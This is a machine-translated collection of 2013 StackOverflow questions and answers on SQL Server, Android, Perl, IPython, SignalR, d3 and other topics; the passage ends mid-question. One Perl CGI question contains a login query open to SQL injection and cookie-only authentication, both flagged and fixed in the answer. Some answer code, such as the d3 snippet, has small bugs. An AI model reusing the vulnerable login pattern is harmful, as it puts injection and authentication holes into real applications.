# StackOverflow 问答 16091000-16091999

# sql-server - 如果 SQL Server USER_NAME() 是系统名，为什么它返回 NVARCHAR(256)？

> ID：16091004
> 
> 赞同：4
> 
> 时间：2013-04-18T18:56:58.453
> 
> 标签：sql-server

我正在处理一个我想`USER_NAME()`在 SQL Server 2008 R2 中保存函数值的列。在[BOL](http://msdn.microsoft.com/en-us/library/ms188014%28v=sql.105%29.aspx)中，该函数被记录为返回类型为`NVARCHAR(256)`.

但是，在其中一个示例中，他们这样做：

```
SELECT name FROM sysusers WHERE name = USER_NAME(1) 
```

并且该`sysusers.name`列具有 type [`sysname`](http://msdn.microsoft.com/en-us/library/ms191240%28v=sql.105%29.aspx)，它（据我所知）实际上是一个`NVARCHAR(128) NOT NULL`. 这种不一致在 的文档中得到了进一步巩固[`CURRENT_USER`](http://msdn.microsoft.com/en-us/library/ms176050%28v=sql.105%29.aspx)，其中说“这个函数相当于`USER_NAME()`”，但表明它的类型是`sysname`（当然，它接着有一个例子，它使用 CURRENT_USER 作为`VARCHAR(30)`列的默认值...... )

是什么赋予了？BOL 的类型是否错误`USER_NAME()`？我使用它安全`NVARCHAR(128)`吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-18T19:03:54.820

好吧，让我们来看看：

```
SELECT name, system_type_id, user_type_id, max_length
  FROM sys.types WHERE name IN (N'sysname', N'nvarchar'); 
```

结果：

```
name      system_type_id  user_type_id  max_length
--------  --------------  ------------  ----------
nvarchar  231             231           8000
sysname   231             256           256 
```

`sysname`只是`nvarchar`定义***字符数***为 128（不是 256）的别名类型。原因`sys.types`说 256 是`nvarchar`每个字符有 2 个字节 - 所以这是 128 个字符 x 2 个字节 = 256 个字节。它们与我们通常所说的“长度”不同。

BOL 说“为什么”的原因没有答案 - 在线图书是错误的，仅此而已。证明：

```
SELECT x = USER_NAME() INTO #foo;
EXEC tempdb..sp_help '#foo'; 
```

部分结果：

```
Column_name  Type      Length
-----------  --------  ------
x            nvarchar  256

-----------------------^^^
---- again, this is 128 characters 
```

是的，您应该可以安全使用`NVARCHAR(128)`，但是为了以防万一，匹配文档是否需要额外费用？也不要再查看已弃用的系统表，例如`sysusers`有关数据类型选择的指导和证实文档。虽然在这种情况`sys.database_principals`下`sys.server_principals`也使用`sysname`它们，但它们是检查 SQL Server 今天如何工作的更可靠的地方，除非您真的在调查 SQL Server 13 多年前的工作方式。

# java - Android位图到ByteArray，反之亦然返回null？

> ID：16091011
> 
> 赞同：0
> 
> 时间：2013-04-18T18:57:22.940
> 
> 标签：java, android, bitmap, buffer

我正在尝试从java分配直接字节缓冲区，从位图填充它并从该缓冲区创建位图。但结果我收到空值。

```
 BitmapFactory.Options options = new BitmapFactory.Options();
    options.inPreferredConfig = Bitmap.Config.ARGB_8888;
    mCurrentBitmap = BitmapFactory.decodeFile(hardCodedPath, options);

    // 4 - bytes count per pixel
    bytesCount = mCurrentBitmap.getWidth() * mCurrentBitmap.getHeight() * 4;

    pixels = ByteBuffer.allocateDirect((int) bytesCount);
    mCurrentBitmap.copyPixelsToBuffer(this.pixels);

    byte[] bitmapdata = new byte[pixels.remaining()];
    pixels.get(bitmapdata);

    BitmapFactory.Options opt = new BitmapFactory.Options();
    opt.inPreferredConfig = Bitmap.Config.ARGB_8888;

    Bitmap newBitmap = BitmapFactory.decodeByteArray(bitmapdata, 0, (int) bytesCount, opt); 
```

有人可以帮我理解为什么 newBitmap 为空吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:19:55.760

`decodeByteArray()`需要编码的位图数据（PNG、JPEG 等），而不是简单的 RGB(A) 字节数组。做你想做的事，你可以简单地使用`Bitmap.setPixels()`. 首先，创建一个正确大小/配置（`Bitmap.create(width, height, Bitmap.Config.ARGB_8888)`例如）的位图，然后调用`setPixels(bitmapdata, 0, width, 0, 0, width, height)`它。

既然你有一个`ByteBuffer`，你可以通过调用更轻松地做到这一点`Bitmap.copyPixelsFromBuffer()`。和 一样`setPixels()`，首先创建一个大小合适的位图。

# html - 删除两个按钮链接之间的破折号

> ID：16091014
> 
> 赞同：1
> 
> 时间：2013-04-18T18:57:26.483
> 
> 标签：html, button, hyperlink

我在一个页面上创建了一个带有两个按钮（即链接）的页面。由于一个未知的原因，在 chrome、ff 和 ie 中的按钮之间会显示一个破折号。我试图在按钮之间留一点空间，而不是这个奇怪的破折号。下面是一些简单的示例代码来复制该问题：

```
<!DOCTYPE html>
<meta charset='utf-8'> 

<html>
    <head><title>Button Dashes?</title></head>
    <body>
        <div>
            <a href="http://www.google.com">
                <button>Google</button>
            </a>
            <a href="http://www.yahoo.com">
                <button>Yahoo</button>
            </a>
        </div>
    </body>
</html> 
```

我需要做什么才能删除按钮之间的破折号？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-18T18:59:52.600

将您的代码更新为：

```
 <div>
        <a href="http://www.google.com"><button>Google</button></a>
        <a href="http://www.yahoo.com"><button>Yahoo</button></a>
    </div> 
```

链接的默认样式有`underlines`，所以空格将只是一个下划线。这是一个例子：http: [//jsfiddle.net/wCfBR/](http://jsfiddle.net/wCfBR/)

这里有一些替代的方法来做`buttons`类似链接：[如何创建一个像链接一样的 HTML 按钮？](https://stackoverflow.com/questions/2906582/how-to-create-an-html-button-that-acts-like-a-link)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:00:38.780

要么在 CSS 文件中声明，要么直接在锚元素上声明，文本装饰为 none

```
<a href="http://www.google.com" style="text-decoration : none;"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-06-22T15:08:59.950

在包裹按钮的锚标签上设置`text-decoration: none;`。

# windows - MATLAB：设置非java命令窗口的标题

> ID：16091019
> 
> 赞同：3
> 
> 时间：2013-04-18T18:57:39.097
> 
> 标签：windows, matlab

## 问题

如何为没有桌面和没有 java 的 MATLAB 窗口设置命令窗口标题？

*   主要兴趣的 Matlab 版本：2012a 及更高版本
*   所需操作系统：主要是 Windows (XP)；更一般的东西
*   理想的解决方案：在下面描述的“mat”函数生成的结果窗口中设置标题。
*   替代解决方案：在下面描述的“matj”函数生成的窗口中设置命令窗口标题。

* * *

## 背景

我有匿名函数来启动“准系统 MATLAB”窗口（每个都从我的主 MATLAB 窗口的终端执行。

```
mat  = @(sCmd) system(['matlab.exe -nodesktop -nosplash -nojvm -r "' sCmd ';" &']);
matj = @(sCmd) system(['matlab.exe -nodesktop -nosplash -r "' sCmd ';" &']); 
```

"matj" 窗口比 "mat" 生成的窗口更占用 RAM 内存。

我知道在启用 java 的窗口中设置标题的技术，例如我的以下（奇怪的是，它在“matj”窗口中不起作用）：

```
cmdtitle = @(sT) com.mathworks.mde.desk.MLDesktop.getInstance.getClient('Command Window').getTopLevelAncestor.setTitle(sT) 
```

* * *

## 为什么我需要这个/我在做什么

我将内存密集型非绘图 MATLAB 任务从“主”MATLAB 窗口（完全加载了 java 和其他花里胡哨）分配给这些准系统窗口。将标题设置为这些将允许我给他们一个关于该窗口分配任务的视觉标签。

此外，能够在这些准系统窗口中扩展显示的文本缓冲区会很有帮助（在我的计算机上，它们似乎限制为 ~500 行）。标题设置问题的解决方法是在准系统窗口显示后向终端显示一个字符串，但有限的缓冲区会阻止第一行持续存在。

非常感谢有关实现这些目标的更好/替代方法的建议，以及您阅读/回答的时间。谢谢你，美好的一天。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T21:09:49.793

听上去你正在做类似于批处理的事情。您可能想查看[Matlab Parallel Computing Toolbox](http://www.mathworks.co.uk/products/parallel-computing/)。这个和 Matlab 的最新版本允许您将您的计算机视为一个迷你计算集群并启动批处理作业，这可以巧妙地解决您的问题。

或者，如果您没有获得许可，您可以使用 windows api 路由来设置窗口标题，并将其包装在 mexFunction 中。因为这很有趣，所以我编写了一些代码来做到这一点：

```
//Include the windows api functions
#include <Windows.h>
//include the matlab mex function stuff
#include "mex.h"

DWORD processID; //the process id of the current matlab

//Callback function, this is the bit that sets the window text
BOOL CALLBACK SetTitleEnum( HWND hwnd, LPARAM lParam ) {    
    DWORD dwID ;
    //get the process of the window this was called on
    GetWindowThreadProcessId(hwnd, &dwID); 
    //if it is our matlab instance, set the title text
    if(dwID == processID) SetWindowText(hwnd, (const char*) lParam);
    return true;
}

void mexFunction(int nlhs, mxArray *plhs[], int nrhs, const mxArray *prhs[]) 
{
    //get the process id of this instance of matlab
    processID = GetCurrentProcessId(); 

    if (nrhs > 0) { //if we have been given a title
        char * title = mxArrayToString(prhs[0]); //get it as a char* string     
        //get all open windows and call the SetTitleEnum function on them
        EnumWindows((WNDENUMPROC)SetTitleEnum, (LPARAM) title);        
        mxFree(title);//free the title string.
    }
} 
```

我使用 Visual Studio 2010 Express 在 Matlab 中编译了上面的代码，无论是在受限命令行版本还是普通的完整桌面 Matlab 中，它对我来说都很好。

# .net - Web API ApiController PUT 和 POST 方法间歇性接收空参数

> ID：16091024
> 
> 赞同：1
> 
> 时间：2013-04-18T18:57:55.053
> 
> 标签：.net, asp.net-web-api

当我在调试器中运行测试时，我的 ApiController 方法有时会收到空参数。但是，如果我触摸控制器文件并重新构建它，它可以在相同的测试中正常工作。一切都是一样的，只是它重新编译了 Web Api 项目的 DLL。我打开了跟踪，但除了参数是否为空之外，它什么也没告诉我。这怎么可能发生？

我猜它无法将 JSON 对象反序列化为参数类型，但我该如何解决这个问题？

**编辑：添加代码**

此方法有时会收到 value=null

```
public FilterItem Post(uint jobId, uint columnID, FilterItemDTO value)
    {
        // save a new FilterItem
    } 
```

FilterItemDTO 是我创建的一个 DTO 类，只是因为 FilterItem 类有一堆不需要的继承字段，我无法在基类中对它们进行注释：

```
public class FilterItemDTO
{
    public uint Id;
    public uint ColumnID { get; set; }
    public FilterItem.FilterType Type;
    public string Value;

    //Date/Time Stamps
    public DateTime? CreatedDate = null;
    public string CreatedBy = null;
    public DateTime? ModifiedDate;
    public string ModifiedBy = null;
    public int FilterLevel = 0;

    public FilterItemDTO(FilterItem f)
    {
        Id = f.ID;
        ColumnID = f.ColumnID;
        Type = f.Type;
        Value = f.Value;
        FilterLevel = f.FilterLevel;
        CreatedDate = f.CreatedDate;
        CreatedBy = f.CreatedBy;
        ModifiedDate = f.ModifiedDate;
        ModifiedBy = f.ModifiedBy;
    }

    internal static FilterItem ToFilterItem(FilterItemDTO value)
    {
        FilterItem f = new FilterItem(value.Type, value.Value, value.FilterLevel);
        f.ID = value.Id;
        f.ColumnID = value.ColumnID;
        f.CreatedDate = value.CreatedDate;
        f.CreatedBy = value.CreatedBy;
        f.ModifiedDate = value.ModifiedDate;
        f.ModifiedBy = value.ModifiedBy;

        return f;
    }

    public FilterItem ToFilterItem()
    {
        return FilterItemDTO.ToFilterItem(this);
    }
} 
```

这是我发送的请求（从 Fiddler 便笺簿复制）

```
POST http://localhost:56875/api/job/4513/column/21213/filter HTTP/1.1
Host: localhost:56875
Connection: keep-alive
Content-Length: 28
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://localhost:56875
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Content-Type: application/json
Referer: http://localhost:56875/Content/test.htm
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3

{"type":"Equal","value":"1"} 
```

这是我的格式化程序配置。type:"Equal" 值应该使用 StringEnumConverter 自动转换。

```
 public class FormatterConfig
{
    public static void RegisterGlobalFormatters(MediaTypeFormatterCollection formatters)
    {
        var jsonSerializerSettings = formatters.JsonFormatter.SerializerSettings;
        jsonSerializerSettings.Converters.Add(new IsoDateTimeConverter());

        // serialize every enum as a string
        jsonSerializerSettings.Converters.Add(new Newtonsoft.Json.Converters.StringEnumConverter());

        // include null value fields
        jsonSerializerSettings.NullValueHandling = NullValueHandling.Ignore;

        // use camel case
        jsonSerializerSettings.ContractResolver = new CamelCasePropertyNamesContractResolver();

        // indented formatting
        formatters.JsonFormatter.Indent = true;

        formatters.Remove(formatters.XmlFormatter);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:24:28.213

我会先尝试隔离问题：

*   注释掉一个控制器中除了一种方法之外的所有内容，看看它是否仍然受到影响

*   对每个单独的方法做同样的事情

*   如果它们孤立地很好，那么这意味着方法可能没有明确分开，也许有时 WebApi 选择了错误的方法（因为缺少属性或其他原因）

*   如果它们仍然失败，并且失败仍然是随机的，我会检查是否有任何不可靠的对象传入 - 尝试使用 fiddler 多次重播请求并检查它们在失败时的差异（参数、cookie、接受/内容类型标头ETC。）

*   从 app_start 调试，如果需要，可以多次调试——你可能很清楚你的失败模式，继续调试看看请求之间发生了什么变化

*   检查是否有任何方法/测试没有以任何其他方式覆盖应用程序的任何配置/更改状态

*   尝试从你的对象中删除复杂的属性，只保留原始类型，看看是否有帮助（如果有，这意味着类型的序列化可能存在问题（例如与继承相关））

*   更改序列化程序

如果这些都没有帮助，请发布一些代码。

# perl - Perl Catalyst 搜索功能可搜索多列

> ID：16091028
> 
> 赞同：2
> 
> 时间：2013-04-18T18:58:00.157
> 
> 标签：perl, catalyst

我在 SQLite 数据库中有一个表，并且我有一个名为 Account 的模式。我还有一个搜索用户的表单。在我的控制器中，我这样做：

```
my $params ||= $c->req->parameters; # Don't know what the difference is between ||= and =, did that way because someone had done it to and it works
my $search_term = $params->{search};

if( $c->request->params{submit} )
{
    $c->stash->{search_term} = $search_term;

    $c->stash->{search_results} = $c->model("DB::Account")->find({
        firstname => { like => "%$search_term%" },
    }) if $c->stash->{search_term};
} 
```

然后在我看来，我有这样的事情。

```
[% IF search_results > 0 %]
  [% FOREACH results IN search_results %]
    [% results.email %] <br/>
    [% results.firstname %]
[% END %] 
```

上面的代码工作正常。我想要做的是搜索与 或其他列匹配的表`firstname`，`lastname`而不仅仅是一列。

我对 Catalyst 框架和 Perl 相当陌生（用 perl 做过一些事情，但不是很先进），所以任何帮助和提示将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:20:26.923

至于这个：

```
my $params ||= $c->req->parameters; 
```

相同：

```
my $params = $params || $c->req->parameters; # when $params is not defined 
                                             # it will be used the part after || 
```

至于从表中搜索行。该方法`find`将只找到一行。

```
$c->stash->{search_results} = $c->model("DB::Account")->find({
        firstname => { like => "%$search_term%" },            
}); 
```

为了找到所有行，您应该使用方法`search`或`search_rs`. 像这样的东西：

```
$c->stash->{search_results} = $c->model("DB::Account")->search({
        firstname => { like => "%$search_term%" },
        lastname => "Smith",
        email => "jsmith@abc.de"
}) 
```

就这样！有关更多信息，您必须阅读[DBIx::Class::ResultSet](https://metacpan.org/module/DBIx%3a%3aClass%3a%3aResultSet)

**UPD**

为了在你的 tt 文件中查看结果，你应该使用这个：

```
[% WHILE (row = search_results.next) %]
[% row.email %]
[% row.firstname %]
[% END %] 
```

# ios - 在 Facebook 上分享不带 http:// 方案的链接

> ID：16091029
> 
> 赞同：0
> 
> 时间：2013-04-18T18:58:11.287
> 
> 标签：ios, facebook

我们有一个 iPad 应用程序，它通过 Facebook 共享部分应用程序的链接。单击链接时，共享的链接必须打开该 iPad 应用程序。这有像 AppName:// 这样的链接 url。Facebook 不支持此链接通过 Share Link 共享，因为它不符合 url 方案。全新且有客户回复可行性，是否可以通过Facebook App或其他方式满足要求？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T07:06:31.977

我通过在 Facebook 上共享链接（使用“http”url 方案）解决了这个问题，该页面具有 javascript 以使用 iPad 打开应用程序方案加载 url。与以下相同：

```
<html><head></head><body onload="OpeniPadApp()">

 <script type="text/javascript">
     function OpeniPadApp() {
         window.location = 'AppName://';
     }
 </script>

</body></html> 
```

而已。当链接打开时，页面加载事件会触发重定向到打开的 iPad 应用程序。

# python - 使用 ipython 时在远程 ipengine 上重新加载模块

> ID：16091032
> 
> 赞同：4
> 
> 时间：2013-04-18T18:58:20.590
> 
> 标签：python, parallel-processing, ipython

希望这有一个我在阅读文档时错过的直截了当的答案。以下是问题 -

1.  我在启动时在所有 ipengine(s) 上加载了一个模块
2.  我已经对模块进行了更改
3.  我希望将这些更改传播到远程 ipengine(s)，即我希望在所有远程实例中重新加载模块

如何实现？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-09-15T16:57:45.530

您还可以使用以下命令打开引擎上的 ipython 自动重载功能：

```
%px %load_ext autoreload
%px %autoreload 2 
```

请注意，此解决方案和使用 dview.execute() 调用 reload 当新引擎稍后可以上线时（如在集群上使用批处理调度程序时）都有问题：它们仅在当前存在的引擎上执行。

另一个问题：您可能需要深度（递归）重新加载。请参阅 ipengine 的此选项：

```
--ZMQInteractiveShell.deep_reload=<CBool>
Default: False
Enable deep (recursive) reloading by default. IPython can use the
deep_reload module which reloads changes in modules recursively (it replaces
the reload() function, so you don't need to change anything to use it).
deep_reload() forces a full reload of modules whose code may have changed,
which the default reload() function does not.  When deep_reload is off,
IPython will use the normal reload(), but deep_reload will still be
available as dreload(). 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T20:12:28.913

这是我找到的答案，不确定这是否是最好的方法

```
from IPython.parallel import Client
rc = Client(profile='ssh')
dview = rc[:]
dview.execute('reload(<module>)', block = True) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-26T19:21:49.523

我遇到了同样的问题，我正在开发一个我想在远程引擎上测试的模块，但我不想将我的更改提交给 git，然后在每次远程重新加载之前拉动引擎机器上的更改。

可能有更好的方法来做到这一点，但我的解决方案是编写[一个简单的帮助模块](https://github.com/ihincks/ishuttle)，它可以很容易地通过 scp 将正在进行的代码传送到引擎。

我将在这里复制使用示例：

```
import IPython.parallel
import ishuttle
import my_module as mm

# Create a client for the cluster with remote engines
rc = IPython.parallel.Client(profile='remote_ssh_engines')
dview = rc[:]

# Create a shuttle object; the engines' working directory
# is switched to '/Remote/engine/server/scratch' after its creation
s = ishuttle.Shuttle(rc, '/Remote/engine/server/scratch')

# Make my_module available on all engines as mm. This code scp's the
# module over, imports it as mm, then reloads it.
s.remote_import('my_module', import_as='mm')

# Apply our favourite function from our favourite module
dview.apply_sync(mm.my_func, 'favourite argument for my_func') 
```

# perl - Perl CGI::Cookie 未在 Safari 中设置

> ID：16091033
> 
> 赞同：1
> 
> 时间：2013-04-18T18:58:21.030
> 
> 标签：perl, cookies, cgi

我对 perl 很陌生。我制作了一个简单的登录脚本，它应该在重定向到我的表单页面之前设置一个 cookie。我已经尝试了我能想到的一切，但 Safari 中没有设置 cookie。几个帖子显示出细微的变化，我都试过了。

我的代码：

```
my $userQuery = "SELECT user_name , password FROM egi_users WHERE user_name = '$username' AND password = '$cryptword'";
my $result = $dbh->prepare($userQuery);
$result->execute()or die "MYSQL ERROR : $DBI::errstr\n";

my $rows = $result->rows;

if($rows == 1){

    #login is valid. Create cookie and send to patient_data page.                                                                                          
    #print("success\n");                                                                                                                                   

    my $c = CGI::Cookie->new(-name=>'login_access',
                             -value=>$username,
                             -expires=>'+1h');

    print $q->redirect(-uri=>'http://mytestserver.com/cgi/patient_data.pl' , -status => '301' , -cookie => $c);

}else{

    print $q->redirect(-uri=>'http://mytestserver.com/);
} 
```

我已经实现了 CGI 所需的所有功能；

使用 CGI；使用 CGI::Carp... 使用 CG::Session；使用 CGI::Cookie；

该脚本正确验证和重定向，但没有设置任何 cookie。我不确定我在做什么。如果您有更好的方法建议，那也很棒。

感谢您的关注

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T23:45:15.500

状态 301 是永久重定向。您正在检查用户是否已登录，然后如果他们提供正确的用户名/密码，则给他们永久重定向？他们如何注销或以其他人身份登录？这将是不可能的。

为此，您需要清除 Safari 缓存并使用状态 303，“查看其他”。

此外，您的代码容易受到 SQL 注入攻击。尝试：

```
my $userQuery = "SELECT user_name , password FROM egi_users WHERE user_name = ? AND password = ?";
my $result = $dbh->prepare($userQuery);
$result->execute($username, $cryptword)or die "MYSQL ERROR : $DBI::errstr\n"; 
```

此外，似乎有人可以通过制作一个包含其用户名的 cookie 来登录您的应用程序。谁需要密码...

# c# - Ajax AutoCompleteExtender 触发 C# 事件

> ID：16091034
> 
> 赞同：1
> 
> 时间：2013-04-18T18:58:25.190
> 
> 标签：c#, asp.net, ajax, autocompleteextender

我希望我的 AutoCompleteExtender 选择在后面的代码中触发一个事件。我之前从 javascript 代码中触发了 onClick 事件，但在这种情况下，这似乎是额外的步骤。最终，当用户从 AutoCompleteExtender 列表中选择一个名称时，我想获取与该名称关联的 ID，调用服务以获取更多数据，然后添加到页面上的 GridView。我目前所拥有的...

```
<ajaxToolkit:AutoCompleteExtender ID="StudentNameSearchTextBox_AutoCompleteExtender" runat="server"
    TargetControlID="StudentNameSearchTextBox" 
    ServicePath="~/Scripts/AutoComplete.asmx"
    ServiceMethod="GetStudents"
    OnClientItemSelected="onStudentSelected"
    MinimumPrefixLength="2" 
    CompletionSetCount="30" 
    UseContextKey="True" 
    CompletionListCssClass="autocomplete_completionListElement" 
    CompletionListHighlightedItemCssClass="autocomplete_highlightedListItem" 
    CompletionListItemCssClass="autocomplete_listItem" >
</ajaxToolkit:AutoCompleteExtender> 
```

的JavaScript：

```
<script type="text/javascript">
    function onStudentSelected(sender, e) {
        var selectedStudent = eval("(" + e._value + ")");
        alert(selectedStudent); //this alerts what I expect
        //how to call the SingleStudentSelected event, and send the selectedStudent 
```

和？

```
 }
</script> 
```

后面的代码：

```
 protected void SingleStudentSelected(object sender, EventArgs e)
    {
        ///TODO: get data from service and add to grid
    } 
```

我可以直接执行此操作，还是需要隐藏按钮或文本框来触发 OnChange 事件？我想以最干净的方式完成这项工作。谢谢。

更新——这是目标文本框——

```
<asp:TextBox ID="StudentNameSearchTextBox" runat="server" 
    CssClass="StudentNameSearch" OnTextChanged="StudentNameSearchTextBox_TextChanged"
    ViewStateMode="Inherit"></asp:TextBox> 
```

将此添加到javascript：

```
 __doPostBack(sender.get_element().name, selectedStudent); 
```

这是事件：

```
 protected void StudentNameSearchTextBox_TextChanged(object sender, EventArgs e)
    {
        ///TODO: get data from service and add to grid
    } 
```

所以，我需要一个隐藏字段来保存 selectedStudent（所选项目的值），以便我可以在 StudentNameSearchTextBox_TextChanged 事件中使用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:52:21.580

在我看来，最干净的方法是将选定的值保存到 HiddenField 的值，从隐藏按钮触发 PostBack 并在按钮的单击事件处理程序中执行所有工作人员。

# signalr - 在 SignalR 中调用特定客户端（使用调用）失败 - 转换问题

> ID：16091036
> 
> 赞同：1
> 
> 时间：2013-04-18T18:58:40.147
> 
> 标签：signalr

谁能解释一下为什么第二个电话（给单个客户）无效？

```
IHubContext hubContext = GlobalHost.ConnectionManager.GetHubContext<SymHubGrid>();

((ClientProxy)(hubContext.Clients.All)).Invoke(method, msg);   // OK

((ClientProxy)(hubContext.Clients.Client(hubConnID))).Invoke(method, msg);  // FAIL 
```

它失败并出现以下异常：
{Microsoft.CSharp.RuntimeBinder.RuntimeBinderException：无法将类型“Microsoft.AspNet.SignalR.Hubs.ConnectionIdProxy”转换为“Microsoft.AspNet.SignalR.Hubs.ClientProxy”

它与我之前[的帖子](https://stackoverflow.com/questions/16079813/how-to-use-a-variable-as-a-method-name-using-dynamic-objects)有关。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:00:05.013

Oeps - 找到了答案 - 我需要转换为 IClientProxy - 而不是实际的代理！

感谢这篇[文章](https://stackoverflow.com/questions/16079813/how-to-use-a-variable-as-a-method-name-using-dynamic-objects/16090685#16090685)中的halter73 ：

它像这样工作正常：（注意 IClientProxy！）

```
IHubContext hubContext = GlobalHost.ConnectionManager.GetHubContext<SymHubGrid>();

((IClientProxy)(hubContext.Clients.All)).Invoke(method, infoDown);

((IClientProxy)(hubContext.Clients.Client(hubConnID))).Invoke(method, infoDown); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:18:12.253

您无需将其强制转换为 ClientProxy 即可调用 Invoke。hubContext.Clients.All.Invoke(method, msg) 就是你所需要的。实际上，您根本不需要调用，只需 hubContext.Clients.All.method( msg );

# javascript - 当页面 AJAX 进入时，jQuery 过滤掉内联 AJAX 请求

> ID：16091041
> 
> 赞同：0
> 
> 时间：2013-04-18T18:58:44.380
> 
> 标签：javascript, jquery, ajax

我有一个历史 API 脚本，它将 URL 中的内容加载到页面主 div 中，然后相应地更改 URL。然而，出于简洁起见我不会解释的原因，我不得不在页面中使用内联脚本来加载音频播放器。当带有播放器的页面使用历史 API 进行 AJAX 处理时，将删除内联脚本。

我之前在使用 jQuery 的 AJAX 函数过滤内联脚本时遇到了问题，但在历史 API 脚本中解决了这个问题：

```
var dom = $(responseData);
dom.filter('script').each(function(){//function to allow inline javascript
    $.globalEval(this.text || this.textContent || this.innerHTML || '');
}); 
```

这在这个内联脚本的情况下不起作用：

```
//append player with js so doesn't show when js disabled
$('#profile_content').append('<div class="artistFeedItem" data-type="track" data-id ="<?php echo $E_ID; ?>" data-ts ="<?php echo $ts; ?>"><img src="../files/images/bigLoader.gif" style="display:block;margin-left:auto;margin-right:auto;"></div>'); //loading

$('*[data-type="track"].artistFeedItem').each(function () {
    //Get player for track and send off variables
    var E_ID = "<?php echo $E_ID; ?>";
    var T_ID = "<?php echo $T_ID; ?>";
    var T_url = "<?php echo $T_url; ?>";
    var T_name = "<?php echo $T_name; ?>";
    var T_timestamp = "<?php echo $T_timestamp; ?>";
    var T_pic = "<?php echo $T_pic; ?>";
    var A_name = "<?php echo $name; ?>";
    $.ajax({
        url: 'player/body_player_template',
        type: 'GET',
        data: {
            T_url: T_url,
            T_name: T_name
        },
        success: function (responseData) {
            $('*[data-type="track"]*[data-id="' + E_ID + '"].artistFeedItem').html(responseData);
        },
        error: function (xhr, textStatus, errorThrown) {
            $('*[data-type="track"]*[data-id="' + E_ID + '"].artistFeedItem').html("Sorry, this track couldn't be loaded. Try refreshing the page.");
        }
    });
}); 
```

那是 AJAX 进入时被过滤掉的内联脚本。

我希望你明白我在问什么，我希望有办法防止这种情况发生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-10T16:56:42.910

不知道为什么我这么久都没有发现这一点，但是在加载 DOM 之前脚本正在执行。我已经改变了周围的功能，以便在加载新的 DOM 后执行脚本。

# javascript - 如何旋转我的文本标签，使它们不能倒置 (SVG)？

> ID：16091044
> 
> 赞同：2
> 
> 时间：2013-04-18T18:58:56.983
> 
> 标签：javascript, svg, d3.js, label, sunburst-diagram

我正在使用 d3.js 制作一个旭日形图创建工具，并且我正在尝试复制[此页面上的标签方式](http://www.jasondavies.com/coffee-wheel/)上标签翻转的方式，以便它们永远不会倒置。问题是我会使用`rotate`该`transform`属性，但它已经用于定位标签。这是我目前的代码：

```
svg.selectAll("text")
    .data(partition.nodes)
    .enter()
    .append("text")
    .attr("transform", function(d) { return "rotate(" + ((d.x + d.dx / 2 - Math.PI / 2) / Math.PI * 180) + ")"; }) 
    .attr("x", function(d) { return Math.sqrt(d.y); })
    .attr("dx", "6") // margin
    .attr("dy", ".35em") // vertical-align
    .text(function(d) { return d.name;}); 
```

我找到了`tspan` `rotate`属性，但结果证明这是一条红鲱鱼，因为它旋转了各个字母。我的图表基于[此页面](http://bl.ocks.org/mbostock/4063423)。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T22:40:39.880

一种选择是将文本嵌套在组内。该组的定位主要就像您当前定位文本一样，除了不使用“x”属性，您将使用除了现有指令之外的`transform`属性。请注意，转换的顺序在这里很重要；你需要先旋转然后翻译。`translate``rotate`

然后，您将对组内的文本应用本地转换。即，如果需要翻转，它将旋转 180 度。这样，文本不需要移动到适当的位置——该组负责处理——但它可能需要在翻转时进行小的局部调整（此外，在这种情况下 ir 可能必须正确对齐）。

下面的代码应该或多或少地做到这一点，尽管我不可能在没有工作的 jsFiddle 的情况下对其进行测试和调整。

```
svg.selectAll("g.label")
  .data(partition.nodes)
  .enter()
  .append("g")
  .attr("class", "label")
  .attr("transform", function(d) {
    // First, rotate the group (not the text) and then translate it
    // by the same amount that used to be applied via "x" attr
    return
      "rotate(" + ((d.x + d.dx / 2 - Math.PI / 2) / Math.PI * 180) + ") " +
      "translate(" + Math.sqrt(d.y) + ")";
  })
  .each(function(d, i) {
    d3.select(this) // select the containing group (which was just created above)
      .append('text') // append text inside the group
      .attr("dx", "6") // margin
      .attr("dy", ".35em") // vertical-align
      .attr("transform", function(d) {
        // Locally transform the text within the containing group:
        // Label should be flipped if group's rotation is greater than Math.PI (aka 180 degs)
        var shouldBeFlipped = d.x + d.dx / 2 - Math.PI / 2 > Math.PI;
        return "rotate(" + (shouldBeFlippled ? 180 : 0) + ")"
      })
      .text(function(d) { return d.name;});
  }); 
```

# android - 如何在Android上显示2个视图，并具有渐变效果？

> ID：16091045
> 
> 赞同：11
> 
> 时间：2013-04-18T18:59:03.287
> 
> 标签：android, android-layout, google-maps-android-api-2

我想在屏幕上显示 2 个视图 - 一个是顶部的相机预览，而另一个将显示图像或谷歌地图 - 并位于屏幕底部。

我想在它们之间有一个类似渐变的过渡——所以它们之间没有粗糙的边缘。能有这样的效果吗？

编辑：我想要实现的效果应该是这样的（顶部来自相机预览，而底部应该是地图......）：

![地图融合到相机照片中](https://i.stack.imgur.com/7wFr2.png)

在 iOS 上，CameraOverlay 显示地图并将图层 masp 设置为渐变时，我得到了类似的效果：

```
CAGradientLayer *gradient = [CAGradientLayer layer];
gradient.frame = self.map.bounds;
